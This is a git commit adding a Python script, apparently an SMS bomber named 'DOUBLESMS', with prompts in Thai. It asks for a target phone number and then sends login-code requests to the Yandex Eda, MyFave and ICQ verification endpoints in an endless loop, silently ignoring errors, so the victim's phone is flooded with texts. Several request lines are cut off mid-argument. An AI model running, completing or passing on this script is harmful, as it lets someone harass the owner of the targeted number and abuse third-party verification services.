e75a33666bf6e2d0ea960e31856458a722724742
KROEKCHAI <74952854+KROEKCHAI@users.noreply.github.com>
2021-10-11 01:17:32 +0700

    Add files via upload

---
+++ sms3Api.py
@@ -0,0 +1,49 @@
+import os, sys, time, requests, random
+_name = ""
+_phone9 = ""
+
+os.system("clear")
+time.sleep(1)
+os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat')
+
+phone = ""
+try:
+    phone = sys.argv[1]
+except:
+    print()
+    print("ตัวอย่าง 66817******")
+    print()
+    phone = input("ใสเบอร์เป้าหมาย : ")
+_phone = phone
+np = "\033[37m\033[47m_\033[0m"
+np2 = "\033[47m_____\033[30m                         \033[0m\033[44m\033[34m_ \033[0m"
+os.system("clear")
+os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat -a')
+block = input("กด ERTER เพื่อส่ง ")
+print(block)
+os.system("clear")
+os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat -a')
+print("กำลังส่งรอสักครู่...")
+
+while True:
+
+    try:
+        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", jso>
+
+    except:
+
+        pass
+
+    try:
+        requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": ">
+
+    except:
+
+        pass
+
+    try:
+        requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39>
+
+    except:
+
+        pass
